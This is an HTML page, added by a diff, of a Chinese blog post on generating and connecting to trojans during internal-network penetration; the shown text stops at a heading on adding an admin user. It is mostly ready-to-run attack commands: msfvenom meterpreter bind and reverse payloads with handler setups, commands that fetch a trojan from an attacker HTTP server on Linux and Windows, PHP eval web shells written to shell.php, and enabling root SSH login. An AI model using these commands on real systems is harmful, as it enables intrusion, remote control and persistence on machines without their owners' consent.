@@ -1,0 +1,735 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="&#x6B63;&#x5411;&#x6728;&#x9A6C;Windows&#x751F;&#x6210;&#x6728;&#x9A6C; 123msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp lhost&#x3D;192.168.63.135 lport&#x3D;6666 -f exe -o test.exe# 32&#x4F4D;&#x6539;&#x4E3A;x8">
+<meta property="og:type" content="article">
+<meta property="og:title" content="木马生成与连接">
+<meta property="og:url" content="http://example.com/2025/05/06/%E6%9C%A8%E9%A9%AC%E7%94%9F%E6%88%90%E4%B8%8E%E8%BF%9E%E6%8E%A5/index.html">
+<meta property="og:site_name" content="lichade&#39;s BLOG">
+<meta property="og:description" content="&#x6B63;&#x5411;&#x6728;&#x9A6C;Windows&#x751F;&#x6210;&#x6728;&#x9A6C; 123msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp lhost&#x3D;192.168.63.135 lport&#x3D;6666 -f exe -o test.exe# 32&#x4F4D;&#x6539;&#x4E3A;x8">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-05-06T07:57:03.000Z">
+<meta property="article:modified_time" content="2025-05-06T07:58:01.400Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="木马">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>木马生成与连接 - lichade&#39;s BLOG</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>lichade&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="木马生成与连接"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-05-06 15:57" pubdate>
+          2025年5月6日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          991 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          9 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">木马生成与连接</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="&#x6B63;&#x5411;&#x6728;&#x9A6C;"><a href="#&#x6B63;&#x5411;&#x6728;&#x9A6C;" class="headerlink" title="&#x6B63;&#x5411;&#x6728;&#x9A6C;"></a>&#x6B63;&#x5411;&#x6728;&#x9A6C;</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>&#x751F;&#x6210;&#x6728;&#x9A6C;</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter/bind_tcp <span class="hljs-attribute">lhost</span>=192.168.63.135 <span class="hljs-attribute">lport</span>=6666 -f exe -o test.exe<br><br><span class="hljs-comment"># 32&#x4F4D;&#x6539;&#x4E3A;x86</span><br></code></pre></td></tr></table></figure>
+
+<p>&#x8FDE;&#x63A5;&#x6728;&#x9A6C;</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole                                   <br>use exploit/multi/handler                    <br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp   <br><span class="hljs-built_in">set</span> rhost 192.168.53.135                           <span class="hljs-comment"># &#x76EE;&#x6807;&#x4E3B;&#x673A;ip</span><br><span class="hljs-built_in">set</span> lport 6666                               <br>exploit<br></code></pre></td></tr></table></figure>
+
+<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>&#x751F;&#x6210;&#x6728;&#x9A6C;</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p linux/x64/meterpreter/bind_tcp <span class="hljs-attribute">lhost</span>=192.168.53.135 <span class="hljs-attribute">lport</span>=6666 -f elf &gt; test.elf<br></code></pre></td></tr></table></figure>
+
+<p>&#x8FDE;&#x63A5;&#x6728;&#x9A6C;</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole                                  <br>use exploit/multi/handler                   <br><span class="hljs-built_in">set</span> payload linux/x64/meterpreter/bind_tcp   <br><span class="hljs-built_in">set</span> rhost 192.168.53.135                        <span class="hljs-comment"># &#x76EE;&#x6807;&#x4E3B;&#x673A;ip  </span><br><span class="hljs-built_in">set</span> lport 6666                              <br>exploit<br></code></pre></td></tr></table></figure>
+
+<h2 id="&#x53CD;&#x5411;&#x6728;&#x9A6C;"><a href="#&#x53CD;&#x5411;&#x6728;&#x9A6C;" class="headerlink" title="&#x53CD;&#x5411;&#x6728;&#x9A6C;"></a>&#x53CD;&#x5411;&#x6728;&#x9A6C;</h2><h3 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h3><p>&#x751F;&#x6210;&#x6728;&#x9A6C;</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="hljs-attribute">lhost</span>=192.168.53.135 <span class="hljs-attribute">lport</span>=6666 -f exe -o test.exe<br></code></pre></td></tr></table></figure>
+
+<p>&#x8FDE;&#x63A5;&#x6728;&#x9A6C;</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole                                   <br>use exploit/multi/handler                    <br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp   <br><span class="hljs-built_in">set</span> lhost 192.168.53.135                          <span class="hljs-comment"># &#x6211;&#x4EEC;&#x7684;&#x672C;&#x673A;IP</span><br><span class="hljs-built_in">set</span> lport 6666                               <br>exploit <br></code></pre></td></tr></table></figure>
+
+<h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><p>&#x751F;&#x6210;&#x6728;&#x9A6C;</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p linux/x64/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.53.135  <span class="hljs-attribute">LPORT</span>=6666 -f elf &gt; test.elf<br></code></pre></td></tr></table></figure>
+
+<p>&#x8FDE;&#x63A5;&#x6728;&#x9A6C;</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole                                   <br>use exploit/multi/handler                    <br><span class="hljs-built_in">set</span> payload linux/x64/meterpreter/reverse_tcp  <br><span class="hljs-built_in">set</span> lhost 192.168.53.135                   <br><span class="hljs-built_in">set</span> lport 6666                              <br>exploit  <br></code></pre></td></tr></table></figure>
+
+<h1 id="&#x6728;&#x9A6C;&#x4E0A;&#x4F20;"><a href="#&#x6728;&#x9A6C;&#x4E0A;&#x4F20;" class="headerlink" title="&#x6728;&#x9A6C;&#x4E0A;&#x4F20;"></a>&#x6728;&#x9A6C;&#x4E0A;&#x4F20;</h1><h2 id="http&#x4E0B;&#x8F7D;&#x6728;&#x9A6C;"><a href="#http&#x4E0B;&#x8F7D;&#x6728;&#x9A6C;" class="headerlink" title="http&#x4E0B;&#x8F7D;&#x6728;&#x9A6C;"></a>http&#x4E0B;&#x8F7D;&#x6728;&#x9A6C;</h2><p>&#x672C;&#x5730;&#x542F;&#x52A8;http&#x670D;&#x52A1;</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> -m http.server <span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h3><p>shell&#x76F4;&#x63A5;&#x8BF7;&#x6C42;</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http://ip:8888/muma -o /tmp/muma<br>wget http://ip:8888/muma -O /var/www/html/muma<br></code></pre></td></tr></table></figure>
+
+<p>python&#x8BF7;&#x6C42;</p>
+<figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csp">python3 -c &quot;import requests; r = requests.get(<span class="hljs-string">&apos;http://ip:8888/muma&apos;</span>); open(<span class="hljs-string">&apos;/tmp/muma&apos;</span>, <span class="hljs-string">&apos;wb&apos;</span>).write(r.content)&quot;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csp">python -c &quot;import urllib.request;urllib.request.urlretrieve(<span class="hljs-string">&apos;&#x8FDC;&#x7A0B;&#x6587;&#x4EF6;&#x7684;URL&apos;</span>, <span class="hljs-string">&apos;&#x4FDD;&#x5B58;&#x5230;&#x672C;&#x5730;&#x7684;&#x8DEF;&#x5F84;&apos;</span>)&quot;<br></code></pre></td></tr></table></figure>
+
+<p>PHP&#x73AF;&#x5883;&#x62FF;&#x5230;shell&#x540E;&#x5728;shell&#x547D;&#x4EE4;&#x7AEF;&#x6267;&#x884C;</p>
+<figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csp">php -r &quot;file_put_contents(<span class="hljs-string">&apos;&#x4FDD;&#x5B58;&#x5230;&#x672C;&#x5730;&#x7684;&#x8DEF;&#x5F84;&apos;</span>, fopen(<span class="hljs-string">&apos;&#x8FDC;&#x7A0B;&#x6587;&#x4EF6;&#x7684;URL&apos;</span>, <span class="hljs-string">&apos;r&apos;</span>));&quot;<br></code></pre></td></tr></table></figure>
+
+<p>&#x5982;&#x679C;&#x6709;rubu&#x4E5F;&#x53EF;&#x4EE5;&#x7528;ruby&#x6267;&#x884C;&#x4EE3;&#x7801;&#x4E0B;&#x8F7D;&#x6587;&#x4EF6;&#xFF1A;</p>
+<figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csp">ruby -e &quot;require <span class="hljs-string">&apos;open-uri&apos;</span>; open(<span class="hljs-string">&apos;&#x8FDC;&#x7A0B;&#x6587;&#x4EF6;&#x7684;URL&apos;</span>) {|f| File.open(<span class="hljs-string">&apos;&#x4FDD;&#x5B58;&#x5230;&#x672C;&#x5730;&#x7684;&#x8DEF;&#x5F84;&apos;</span>, <span class="hljs-string">&apos;wb&apos;</span>) {|file| file.puts f.read} }&quot;<br></code></pre></td></tr></table></figure>
+
+<p>&#x6709;&#x4E9B;linux&#x670D;&#x52A1;&#x5668;&#x91CC;&#x81EA;&#x5E26;&#x7684;&#x5C31;&#x6709;perl&#x8BED;&#x8A00;&#xFF0C;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;perl&#x6267;&#x884C;&#x4EE3;&#x7801;&#x4E0B;&#x8F7D;&#x6587;&#x4EF6;</p>
+<figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csp">perl -e &quot;use LWP::Simple; getstore(<span class="hljs-string">&apos;&#x8FDC;&#x7A0B;&#x6587;&#x4EF6;&#x7684;URL&apos;</span>, <span class="hljs-string">&apos;&#x4FDD;&#x5B58;&#x5230;&#x672C;&#x5730;&#x7684;&#x8DEF;&#x5F84;&apos;</span>)&quot;<br></code></pre></td></tr></table></figure>
+
+<p>java&#x4E0B;&#x8F7D;&#x5FC5;&#x987B;&#x5F97;&#x6307;&#x5B9A;&#x5E93;&#xFF0C;&#x4E0D;&#x662F;&#x5F88;&#x597D;&#x7528;&#xFF0C;&#x6CA1;&#x6709;&#x5565;&#x901A;&#x7528;&#x7684;&#x65B9;&#x6CD5;</p>
+<p>nc&#x6709;&#x4E24;&#x4E2A;&#x4F5C;&#x7528;&#xFF0C;&#x4E00;&#x4E2A;&#x662F;&#x76D1;&#x542C;&#x6570;&#x636E;&#xFF0C;&#x4E00;&#x4E2A;&#x662F;&#x4F20;&#x8F93;&#x6570;&#x636E;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;nc&#x5B9E;&#x73B0;&#x6587;&#x4EF6;&#x4F20;&#x8F93;&#x3002;</p>
+<p>&#x6BD4;&#x5982;&#x4ECE;vps&#x5411;&#x672C;&#x5730;kali&#x4F20;&#x4E00;&#x4E2A;test.txt&#xFF0C;&#x5728;vps&#x4E0A;&#x8F93;&#x5165;</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">9383</span> &lt; test.txt<br></code></pre></td></tr></table></figure>
+
+<p>&#x7136;&#x540E;&#x5728;&#x672C;&#x5730;kali&#x8F93;&#x5165;</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> VPS_IP <span class="hljs-number">9383</span> &gt; test.txt<br></code></pre></td></tr></table></figure>
+
+<p>SSH:&#x7528;&#x5230;&#x7684;&#x662F;scp&#x547D;&#x4EE4;&#xFF0C;scp&#x662F;&#x57FA;&#x4E8E;SSH&#x767B;&#x5F55;&#x8FDB;&#x884C;&#x5B89;&#x5168;&#x7684;&#x8FDC;&#x7A0B;&#x6587;&#x4EF6;&#x62F7;&#x8D1D;&#x3002;</p>
+<p>&#x4F7F;&#x7528;&#x65B9;&#x6CD5;&#xFF1A;&#x5C06;&#x672C;&#x5730;&#x590D;&#x5236;&#x5230;&#x8FDC;&#x7A0B;</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">scp <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>test<span class="hljs-regexp">/test.txt root@192.168.8.112:/</span>root<br></code></pre></td></tr></table></figure>
+
+<p>&#x5C06;&#x8FDC;&#x7A0B;&#x6587;&#x4EF6;&#x590D;&#x5236;&#x5230;&#x672C;&#x5730;</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs elixir">&#x5982;&#x679C;&#x7528;<span class="hljs-title class_">Kali</span> <span class="hljs-title class_">Linux</span>&#x505A;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8BDD;&#xFF0C;&#x9996;&#x5148;&#x9700;&#x8981;&#x4FEE;&#x6539;&#x4E0B;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF08;&#x9ED8;&#x8BA4;<span class="hljs-title class_">Kali</span> <span class="hljs-title class_">Linx</span>&#x4E2D;<span class="hljs-title class_">SSH</span>&#x767B;&#x5F55;&#x662F;&#x7981;&#x7528;root&#x7528;&#x6237;&#x7684;&#xFF09;&#xFF0C;&#x8F93;&#x5165;&#x547D;&#x4EE4;&#xFF1A;<br><br>vim /etc/ssh/sshd_config&#xFF0C;&#x6DFB;&#x52A0;&#x4E00;&#x6761;<span class="hljs-title class_">PermitRootLogin</span> yes<br>&#x7136;&#x540E;&#x91CD;&#x542F;&#x670D;&#x52A1;&#x5373;&#x53EF;<br>service ssh restart<br>scp root<span class="hljs-variable">@192</span>.<span class="hljs-number">168.8</span>.<span class="hljs-number">111</span><span class="hljs-symbol">:/var/www/html/test/test</span>.txt /root<br></code></pre></td></tr></table></figure>
+
+<p>Rsync&#x662F;Linux&#x7CFB;&#x7EDF;&#x4E2D;&#x4E00;&#x4E2A;&#x955C;&#x50CF;&#x5907;&#x4EFD;&#x5DE5;&#x5177;&#xFF0C;&#x53EF;&#x4EE5;&#x8FDC;&#x7A0B;&#x540C;&#x6B65;&#xFF0C;&#x6587;&#x4EF6;&#x590D;&#x5236;&#xFF0C;&#x9ED8;&#x8BA4;&#x7CFB;&#x7EDF;&#x81EA;&#x5E26;&#x4E14;&#x8FD0;&#x884C;</p>
+<p>&#x7B2C;&#x4E00;&#x79CD;&#x2014;&#x2014;&#x8FDC;&#x7A0B;&#x540C;&#x6B65;:</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">rsync -r /var/www/html/test &#xFF08;<span class="hljs-title class_">Kali</span> <span class="hljs-title class_">Linux</span>&#x7684;&#x76EE;&#x5F55;&#xFF09;<span class="hljs-number">192.168</span>.<span class="hljs-number">8.112</span><span class="hljs-symbol">:/var/www/html/</span>&#xFF08;&#x8FDC;&#x7A0B;&#x4E3B;&#x673A;&#x88AB;&#x540C;&#x6B65;&#x7684;&#x76EE;&#x5F55;&#xFF09;<br></code></pre></td></tr></table></figure>
+
+<p>&#x7136;&#x540E;&#x5C31;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6587;&#x4EF6;&#x540C;&#x6B65;&#x4E0A;&#x6765;&#x4E86;&#x3002;</p>
+<h3 id="Windows-2"><a href="#Windows-2" class="headerlink" title="Windows"></a>Windows</h3><p>cmd&#x4E0B;</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">certutil -urlcache -<span class="hljs-built_in">split</span> -f http://ip:8888/muma.exe muma.exe<br>bitsadmin /transfer myDownloadJob /download /priority normal http://ip:8888/muma.exe C:\path\to\save\muma.exe<br></code></pre></td></tr></table></figure>
+
+<p>powershell&#x4E0B;</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nix">Invoke-WebRequest <span class="hljs-operator">-</span>Uri <span class="hljs-string">&quot;http://ip:8888/muma.exe&quot;</span> <span class="hljs-operator">-</span>OutFile <span class="hljs-string">&quot;C:<span class="hljs-char escape_">\p</span>ath<span class="hljs-char escape_">\t</span>o<span class="hljs-char escape_">\s</span>ave<span class="hljs-char escape_">\m</span>uma.exe&quot;</span><br>Invoke-RestMethod <span class="hljs-operator">-</span>Uri <span class="hljs-string">&quot;http://ip:8888/muma.exe&quot;</span> <span class="hljs-operator">-</span>OutFile <span class="hljs-string">&quot;C:<span class="hljs-char escape_">\p</span>ath<span class="hljs-char escape_">\t</span>o<span class="hljs-char escape_">\s</span>ave<span class="hljs-char escape_">\m</span>uma.exe&quot;</span><br>Start-BitsTransfer <span class="hljs-operator">-</span>Source <span class="hljs-string">&quot;http://ip:8888/muma.exe&quot;</span> <span class="hljs-operator">-</span>Destination <span class="hljs-string">&quot;C:<span class="hljs-char escape_">\p</span>ath<span class="hljs-char escape_">\t</span>o<span class="hljs-char escape_">\s</span>ave<span class="hljs-char escape_">\m</span>uma.exe&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="&#x76F4;&#x63A5;&#x8BFB;&#x53D6;&#x5199;&#x5165;"><a href="#&#x76F4;&#x63A5;&#x8BFB;&#x53D6;&#x5199;&#x5165;" class="headerlink" title="&#x76F4;&#x63A5;&#x8BFB;&#x53D6;&#x5199;&#x5165;"></a>&#x76F4;&#x63A5;&#x8BFB;&#x53D6;&#x5199;&#x5165;</h2><h3 id="Linux-3"><a href="#Linux-3" class="headerlink" title="Linux"></a>Linux</h3><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">echo &apos;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;pass&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&apos; &gt; shell.php</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="Windows-3"><a href="#Windows-3" class="headerlink" title="Windows"></a>Windows</h3><p>cmd&#x4E0B;</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;pass&quot;</span>]);<span class="hljs-meta">?&gt;</span> &gt; shell.php<br><span class="hljs-keyword">echo</span> ^<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;pass&quot;</span>]);?^&gt; &gt; shell.php<br><span class="hljs-keyword">echo</span> ^<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;pass&quot;</span>]);?^&gt; &gt; shell.php<br></code></pre></td></tr></table></figure>
+
+<p>powershell&#x4E0B;</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">&apos;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;pass&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&apos; | Out-File -FilePath shell.php -Encoding UTF8</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="MSF-shell&#x4E0A;&#x4F20;"><a href="#MSF-shell&#x4E0A;&#x4F20;" class="headerlink" title="MSF shell&#x4E0A;&#x4F20;"></a>MSF shell&#x4E0A;&#x4F20;</h2><p>&#x62FF;&#x5230;meterpreter shell&#x540E;&#x76F4;&#x63A5;&#x4E0A;&#x4F20;&#x6728;&#x9A6C;</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">upload /home/muma<br></code></pre></td></tr></table></figure>
+
+<h2 id="Windows&#x8FDC;&#x7A0B;&#x684C;&#x9762;"><a href="#Windows&#x8FDC;&#x7A0B;&#x684C;&#x9762;" class="headerlink" title="Windows&#x8FDC;&#x7A0B;&#x684C;&#x9762;"></a>Windows&#x8FDC;&#x7A0B;&#x684C;&#x9762;</h2><p>&#x9996;&#x5148;&#x65B0;&#x589E;&#x7528;&#x6237; &#x5E76;&#x52A0;&#x5165;&#x7BA1;&#x7406;&#x7EC4;</p>
